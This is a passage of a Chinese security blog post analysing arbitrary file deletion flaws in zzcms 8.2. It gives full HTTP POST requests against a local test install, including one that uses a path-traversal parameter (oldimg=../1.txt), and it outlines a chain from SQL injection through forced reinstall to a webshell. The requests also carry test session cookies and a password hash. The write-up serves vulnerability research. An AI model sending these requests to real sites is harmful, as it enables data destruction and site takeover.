+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /user/zssave.php HTTP/1.1</span><br><span class="line"></span><br><span class="line"> Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line"> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"></span><br><span class="line"> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line"> Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"></span><br><span class="line"> Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line"> Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"> Content-Length: 289</span><br><span class="line"></span><br><span class="line"> Referer: http://127.0.0.1/user/zsadd.php</span><br><span class="line"></span><br><span class="line"> Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018; UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd</span><br><span class="line"></span><br><span class="line"> Connection: close</span><br><span class="line"></span><br><span class="line"> Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"> proname=thinking&amp;szm=&amp;gnzz=thinking&amp;sm=111111&amp;province=%E8%AF%B7%E9%80%89%E6%8B%A9%E7%9C%81%E4%BB%BD&amp;city=%E8%AF%B7%E9%80%89%E6%8B%A9%E5%9F%8E%E5%8C%BA&amp;xiancheng=&amp;cityforadd=&amp;img=/1.txt&amp;flv=&amp;zc=&amp;yq=&amp;action=add&amp;Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure>
+
+<p> 然后进行如下请求，删除上面操作生成的那篇招商咨询，然后就会连1.txt一并删除。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /user/del.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 97</span><br><span class="line"></span><br><span class="line">Referer: http://127.0.0.1/user/zsmanage.php</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018; UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id%5B%5D=16&amp;submit=%E5%88%A0%E9%99%A4%0D%0A&amp;pagename=zsmanage.php%3Fpage%3D1&amp;tablename=zzcms_main</span><br></pre></td></tr></table></figure>
+
+<h4 id="情况二：在action-modify的情况下进行任意文件删除"><a href="#情况二：在action-modify的情况下进行任意文件删除" class="headerlink" title="情况二：在action=modify的情况下进行任意文件删除"></a>情况二：在action=modify的情况下进行任意文件删除</h4><p> 进行如下请求在oldimg参数的位置构造要删除的目标文件，如根目录下的1.txt，所以可以使用../1.txt进行目录跳转后删除目标文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /user/zssave.php HTTP/1.1</span><br><span class="line"></span><br><span class="line"> Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line"> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"></span><br><span class="line"> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line"> Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"></span><br><span class="line"> Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line"> Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"> Content-Length: 290</span><br><span class="line"></span><br><span class="line"> Referer: http://127.0.0.1/user/zsmodify.php?id=15&amp;page=1</span><br><span class="line"></span><br><span class="line"> Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018; UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd</span><br><span class="line"></span><br><span class="line"> Connection: close</span><br><span class="line"></span><br><span class="line"> Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"> proname=11&amp;szm=&amp;gnzz=22&amp;sm=33&amp;province=%E5%85%A8%E5%9B%BD&amp;city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&amp;xiancheng=&amp;cityforadd=&amp;oldimg=../1.txt&amp;img=%2Fimage%2Fnopic.gif&amp;oldflv=&amp;flv=&amp;zc=&amp;yq=&amp;cpid=15&amp;action=modify&amp;page=1&amp;Submit=%E4%BF%9D%E5%AD%98%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C%0D%0A</span><br></pre></td></tr></table></figure>
+
+<p>配合上sql注入进入后台,利用任意文件删除使cms重装,在配置文件上注入一句话,就可以getshell</p>
+<p><img src="zzcms8-2/dele.png" alt></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.freebuf.com/column/166525.html" target="_blank" rel="noopener">http://www.freebuf.com/column/166525.html</a></p>
+<p><a href="http://www.freebuf.com/column/165934.html" target="_blank" rel="noopener">http://www.freebuf.com/column/165934.html</a></p>
+<p><a href="http://www.freebuf.com/column/166525.html" target="_blank" rel="noopener">http://www.freebuf.com/column/166525.html</a></p>
+<p><a href="https://blog.csdn.net/CSDNPM250/article/details/81414162" target="_blank" rel="noopener">https://blog.csdn.net/CSDNPM250/article/details/81414162</a><br> <a href="http://www.freebuf.com/vuls/161888.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/161888.html</a></p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/09/27/zzcms8-2/">http://yoursite.com/2018/09/27/zzcms8-2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/10/12/web-for-pentester/">Web_for_pentester-01</a>
+            
+            
+            <a class="next" rel="next" href="/2018/09/26/sqli/">宽字节注入和报错注入记录</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
